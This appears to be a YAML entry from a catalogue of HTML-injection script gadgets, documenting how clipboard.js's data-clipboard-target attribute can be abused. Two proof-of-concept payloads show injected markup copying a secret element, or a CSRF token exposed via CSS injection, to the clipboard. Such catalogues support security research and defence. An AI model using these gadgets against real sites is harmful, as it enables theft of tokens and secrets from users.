---
description: Modern copy to clipboard. No Flash. Just 3kb gzipped.
github: zenorocha/clipboard.js
gadgets:
  Latest:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - class-attr
      - data-attr
      - href-attr
      - any-timing
    pocs:
      - description: This gadget is special, it allows copying the content (text) of any element specified by a selector in the `data-clipboard-target` attribute. When combined with an `<a>` tag with an additional click on the attacker's website, it can be used to steal the contents of the clipboard.<br><br>*The [clipboard.js](https://github.com/zenorocha/clipboard.js) library uses "[good-listener](https://www.npmjs.com/package/good-listener)" to [listen to events](https://github.com/zenorocha/clipboard.js/blob/899378dee9681dcf4cb3d702c23a3f3cd9f473d8/src/clipboard.js#L63). This library delegates event listeners to the document, allowing them to be triggered at any time.*
        code: |
          <div id="to_copy">Secret</div>

          <!-- user input -->
          <a href="https://[current-location]/" class="copy-link" data-clipboard-action="copy" data-clipboard-target="#to_copy">Copy Text</a>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
          <script>
            new ClipboardJS(".copy-link");
          </script>
      - description: When chained with a CSS injection, it is possible to `display block` script content to steal sensitive values such as CSRF tokens.
        code: |
          <script id="to_copy">CSRF_TOKEN=1234567890</script>

          <!-- user input -->
          <a href="https://[current-location]/" class="copy-link" data-clipboard-action="copy" data-clipboard-target="#to_copy">Copy Text</a>
          <style> * { display: block } </style>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>
          <script>
            new ClipboardJS(".copy-link");
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/zenorocha/clipboard.js/blob/899378dee9681dcf4cb3d702c23a3f3cd9f473d8/src/clipboard.js#L62">https://github.com/zenorocha/clipboard.js/blob/899378dee9681dcf4cb3d702c23a3f3cd9f473d8/src/clipboard.js#L62</a>

      ```javascript
      listenClick(trigger) {
        this.listener = listen(trigger, 'click', (e) => this.onClick(e));
      }
      ```
---
